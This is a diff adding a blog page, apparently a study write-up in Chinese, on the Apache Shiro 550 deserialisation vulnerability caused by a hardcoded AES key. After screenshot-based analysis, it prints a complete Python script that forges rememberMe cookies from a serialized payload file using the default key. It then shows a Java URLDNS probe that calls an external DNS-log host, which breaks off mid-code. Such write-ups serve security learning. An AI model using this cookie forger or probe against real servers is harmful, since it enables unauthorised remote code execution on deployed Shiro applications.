@@ -1,0 +1,715 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="简介该漏洞的原因是因为固定的key 加密 分析通过搜索cookie 就可以很快的发现这个类  然后通过分析发现里面存在 rememberSerializedIdentity 这个明显是一个序列化的过程  既然存在序列化的过程那么肯定存在反序列化的过程  发现确实存在这个 这个的函数其实很简单就是将这个base64解码之后然后返回给其他函数 我们可以尝试找一下在哪里调用了这个  从函数的名字其实就可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shiro550">
+<meta property="og:url" content="https://tsy244.github.io/2025/10/10/java%E5%AE%89%E5%85%A8/shiro550/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="简介该漏洞的原因是因为固定的key 加密 分析通过搜索cookie 就可以很快的发现这个类  然后通过分析发现里面存在 rememberSerializedIdentity 这个明显是一个序列化的过程  既然存在序列化的过程那么肯定存在反序列化的过程  发现确实存在这个 这个的函数其实很简单就是将这个base64解码之后然后返回给其他函数 我们可以尝试找一下在哪里调用了这个  从函数的名字其实就可">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171719172.(null)">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171726205.(null)">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171735187.(null)">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171743597.(null)">
+<meta property="og:image" content="https://zxlhydvugj2.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2FkZGFjMTJlNGM2YTEzMzQ0ZTZiNjE2NzIyY2NhNDhfaWcwR2E2QkhtYVZYU2paejFQVkZrQll1TGlobmVLQnFfVG9rZW46WEdVeGJNQVZjbzc0NXR4UklieGN2RXl0blBjXzE3NjAwODc4MTc6MTc2MDA5MTQxN19WNA">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171747711.(null)">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171753464.(null)">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171757471.(null)">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171800729.(null)">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171803906.(null)">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171807008.(null)">
+<meta property="article:published_time" content="2025-10-10T06:27:38.000Z">
+<meta property="article:modified_time" content="2025-10-10T09:18:56.660Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>shiro550 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="shiro550"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-10 14:27" pubdate>
+          October 10, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          43 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">shiro550</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>该漏洞的原因是因为固定的key 加密</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>通过搜索cookie 就可以很快的发现这个类</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>然后通过分析发现里面存在</p>
+<p>rememberSerializedIdentity 这个明显是一个序列化的过程</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171719172.(null)" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>既然存在序列化的过程那么肯定存在反序列化的过程</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171726205.(null)" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>发现确实存在这个</p>
+<p>这个的函数其实很简单就是将这个base64解码之后然后返回给其他函数</p>
+<p>我们可以尝试找一下在哪里调用了这个</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171735187.(null)" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>从函数的名字其实就可以发现获取认证信息</p>
+<p>那么看看如何获取的详细信息</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171743597.(null)" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>然后继续</p>
+<p>看convertBytesToPrincipals</p>
+<p><img src="https://zxlhydvugj2.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2FkZGFjMTJlNGM2YTEzMzQ0ZTZiNjE2NzIyY2NhNDhfaWcwR2E2QkhtYVZYU2paejFQVkZrQll1TGlobmVLQnFfVG9rZW46WEdVeGJNQVZjbzc0NXR4UklieGN2RXl0blBjXzE3NjAwODc4MTc6MTc2MDA5MTQxN19WNA" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>发现是要给解密然后反序列化</p>
+<p>这个时候其实就可以断定这个存在问题了</p>
+<p>因为这个反序列化的对象是我们可控的，然后这个就会自动的进行反序列化操作</p>
+<p>可以看一下解密的地方</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171747711.(null)" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171753464.(null)" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>通过签名可以猜测出是要给对称加密</p>
+<p>可以尝试找一个key 是什么</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171757471.(null)" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171800729.(null)" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171803906.(null)" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>一直往上找的话会找到</p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/(null)-20251010171807008.(null)" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>由于找到了这个key 可以从注释中发现是aes 加密，这个导致了我们可以任意的去操控这个cookie 从而导致反序列化漏洞</p>
+<p>复制到利用工具中</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> codecs<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Shiro550CookieGenerator</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key, ser_file</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;初始化Shiro cookie生成器&quot;&quot;&quot;</span><br>        self.key = key<br>        self.ser_file = ser_file<br>        <span class="hljs-comment"># 确保密钥长度为16字节（AES-128）</span><br>        self.key = self._pad_key(key)<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_pad_key</span>(<span class="hljs-params">self, key</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;填充密钥到16字节&quot;&quot;&quot;</span><br>        key = key.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(key, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">else</span> key<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) &lt; <span class="hljs-number">16</span>:<br>            key += <span class="hljs-string">b&#x27;\0&#x27;</span> * (<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(key))<br>        <span class="hljs-keyword">return</span> key[:<span class="hljs-number">16</span>]<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_encrypt</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;使用AES算法加密数据&quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 使用CBC模式，IV为16个0</span><br>        iv = <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">16</span><br>        cipher = AES.new(self.key, AES.MODE_CBC, iv)<br>        <br>        <span class="hljs-comment"># 填充数据到16字节的倍数</span><br>        data = self._pkcs7_pad(data)<br>        <br>        <span class="hljs-comment"># 加密数据</span><br>        encrypted = cipher.encrypt(data)<br>        <span class="hljs-keyword">return</span> encrypted<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_pkcs7_pad</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;PKCS7填充&quot;&quot;&quot;</span><br>        block_size = <span class="hljs-number">16</span><br>        padding = block_size - (<span class="hljs-built_in">len</span>(data) % block_size)<br>        <span class="hljs-keyword">return</span> data + <span class="hljs-built_in">bytes</span>([padding]) * padding<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_cookie</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;生成Shiro RememberMe cookie&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 从文件读取序列化数据</span><br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(self.ser_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                serialized_data = f.read()<br>            <br>            <span class="hljs-comment"># 加密序列化数据</span><br>            encrypted_data = self._encrypt(serialized_data)<br>            <br>            <span class="hljs-comment"># 进行Base64编码</span><br>            base64_encrypted = base64.b64encode(encrypted_data)<br>            <br>            <span class="hljs-comment"># 构造RememberMe cookie值</span><br>            <span class="hljs-comment"># Shiro RememberMe cookie格式: base64(encrypted_data)</span><br>            remember_me_cookie = base64_encrypted.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            <br>            <span class="hljs-comment"># 生成JSESSIONID（可选）</span><br>            jsession_id = <span class="hljs-built_in">str</span>(uuid.uuid4())<br>            <br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-string">&#x27;rememberMe&#x27;</span>: remember_me_cookie,<br>                <span class="hljs-string">&#x27;JSESSIONID&#x27;</span>: jsession_id<br>            &#125;<br>            <br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;生成cookie时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_cookie_info</span>(<span class="hljs-params">cookie</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;格式化输出cookie信息&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cookie:<br>        <span class="hljs-keyword">return</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n===== 生成的Shiro Cookie信息 =====&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;rememberMe: <span class="hljs-subst">&#123;cookie[<span class="hljs-string">&#x27;rememberMe&#x27;</span>]&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;JSESSIONID: <span class="hljs-subst">&#123;cookie[<span class="hljs-string">&#x27;JSESSIONID&#x27;</span>]&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n===== HTTP请求头示例 =====&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Cookie: rememberMe=<span class="hljs-subst">&#123;cookie[<span class="hljs-string">&#x27;rememberMe&#x27;</span>]&#125;</span>; JSESSIONID=<span class="hljs-subst">&#123;cookie[<span class="hljs-string">&#x27;JSESSIONID&#x27;</span>]&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;================================\n&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;主函数&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 硬编码的AES密钥（此处为示例密钥，实际使用时请替换为目标系统的密钥）</span><br>    hardcoded_key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    <br>    <span class="hljs-comment"># 检查是否提供了ser.bin文件路径</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;用法: python exp.py &lt;ser.bin文件路径&gt;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;示例: python exp.py ./ser.bin&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <br>    ser_file = sys.argv[<span class="hljs-number">1</span>]<br>    <br>    <span class="hljs-comment"># 创建Shiro cookie生成器</span><br>    generator = Shiro550CookieGenerator(hardcoded_key, ser_file)<br>    <br>    <span class="hljs-comment"># 生成cookie</span><br>    cookie = generator.generate_cookie()<br>    <br>    <span class="hljs-comment"># 输出cookie信息</span><br>    print_cookie_info(cookie)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="Shiro-依赖分析"><a href="#Shiro-依赖分析" class="headerlink" title="Shiro 依赖分析"></a>Shiro 依赖分析</h1><p>由于shiro 本身是没有cc 的，支撑尝试攻击一下cb 和Java 本身的链子</p>
+<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>我们可以通过DNSURL 这条链子判断</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.shiro;<br><br><span class="hljs-keyword">import</span> com.sun.xml.internal.messaging.saaj.util.ByteOutputStream;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.CipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><span class="hljs-keyword">import</span> sun.misc.BASE64Decoder;<br><span class="hljs-keyword">import</span> sun.misc.BASE64Encoder;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.StringReader;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">//TIP 要&lt;b&gt;运行&lt;/b&gt;代码，请按 &lt;shortcut actionId=&quot;Run&quot;/&gt; 或</span><br><span class="hljs-comment">// 点击装订区域中的 &lt;icon src=&quot;AllIcons.Actions.Execute&quot;/&gt; 图标。</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(java.lang.String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">AesKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>;<br>        <span class="hljs-type">CipherService</span> <span class="hljs-variable">cipherService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-type">byte</span>[] key = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BASE64Decoder</span>().decodeBuffer(AesKey);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cip</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">skeySpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(key, <span class="hljs-string">&quot;AES&quot;</span>);<br>        cip.init(Cipher.ENCRYPT_MODE, skeySpec);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://0ce66042bb.ddns.1433.eu.org.&quot;</span>);<br><span class="hljs-comment">//        setFieldValue(u, &quot;hashCode&quot;, 11);</span><br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URL</span>&gt; urlClass = u.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCodeField</span> <span class="hljs-operator">=</span> urlClass.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashCodeField.setAccessible(<span class="hljs-literal">true</span>);<br>        hashCodeField.set(u, <span class="hljs-number">111</span>);<br><br>        ht.put(u, <span class="hljs-string">&quot;1&quot;</span>);<br><br>        hashCodeField.set(u, -<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">ByteOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteOutputStream</span>();<br>        <span 